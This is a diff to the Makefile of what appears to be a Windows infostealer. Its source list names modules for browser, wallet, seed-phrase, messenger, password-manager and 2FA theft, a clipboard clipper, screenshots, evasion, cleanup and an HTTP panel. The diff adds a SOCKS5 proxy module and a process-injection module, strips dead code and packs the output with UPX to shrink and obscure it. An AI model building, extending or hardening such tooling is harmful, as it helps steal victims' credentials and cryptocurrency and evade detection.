@@ -1,7 +1,7 @@
 CC = x86_64-w64-mingw32-gcc
 NASM = nasm
-CFLAGS = -Wall -Wextra -Wno-error -O2 -Iinclude -Isrc -Isrc/utils -Isrc/parsers -Isrc/browsers -Isrc/wallets -Isrc/system -Isrc/network -Isrc/crypto -Isrc/evasion -Isrc/cleanup
-LDFLAGS = -lws2_32 -lkernel32 -luser32 -ladvapi32 -lbcrypt -lcrypt32 -lshell32 -lole32 -loleaut32 -lgdi32 -mwindows
+CFLAGS = -Wall -Wextra -Wno-error -O2 -fdata-sections -ffunction-sections -Iinclude -Isrc -Isrc/utils -Isrc/parsers -Isrc/browsers -Isrc/wallets -Isrc/system -Isrc/network -Isrc/crypto -Isrc/evasion -Isrc/cleanup
+LDFLAGS = -Wl,--gc-sections -lws2_32 -lkernel32 -luser32 -ladvapi32 -lbcrypt -lcrypt32 -lshell32 -lole32 -loleaut32 -lgdi32 -mwindows
 
 SRCS = src/main.c \
        src/types/peb.c \
@@ -16,6 +16,7 @@ SRCS = src/main.c \
        src/wallets/wallet_desktop.c \
        src/messengers/messengers.c \
        src/parsers/sqlite.c \
+       src/network/socks5.c \
        src/network/panel_http.c \
        src/network/ws2.c \
        src/network/proxy.c \
@@ -28,6 +29,7 @@ SRCS = src/main.c \
        src/system/screenshot.c \
        src/system/seed_grabber.c \
        src/system/grabber.c \
+       src/system/inject.c \
        src/system/twofa.c \
        src/system/clipper.c \
        src/system/passman.c \
@@ -70,6 +72,7 @@ test: $(TARGET)
 $(TARGET): $(OBJS)
 	$(CC) -o $@ $(OBJS) $(LDFLAGS)
 	x86_64-w64-mingw32-strip --strip-all $@
+	-$(shell command -v upx >/dev/null && echo "upx --best \$@" || true)
 
 %.o: %.c
 	$(CC) $(CFLAGS) -c $< -o $@
